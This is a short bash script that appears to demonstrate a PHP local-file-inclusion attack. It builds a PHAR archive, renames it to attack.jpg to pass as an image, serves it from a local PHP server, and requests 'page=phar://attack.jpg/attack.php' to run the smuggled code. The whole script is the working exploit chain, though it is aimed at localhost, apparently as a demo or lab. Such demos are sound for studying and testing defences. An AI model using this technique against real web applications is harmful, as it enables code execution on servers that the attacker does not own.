#!/bin/bash
set -eu

php -d phar.readonly=0 php-rfi-smuggling.php
mv attack.phar attack.jpg
file attack.jpg
cp attack.jpg ./target

# Start server and keep it alive
(cd ./target && php -S localhost:7080) &
SERVER_PID=$!
sleep 1

firefox 'http://localhost:7080?page=home.php' &
sleep 1
firefox 'http://localhost:7080?page=phar://attack.jpg/attack.php'

# Keep script alive so server doesn't die
wait $SERVER_PID
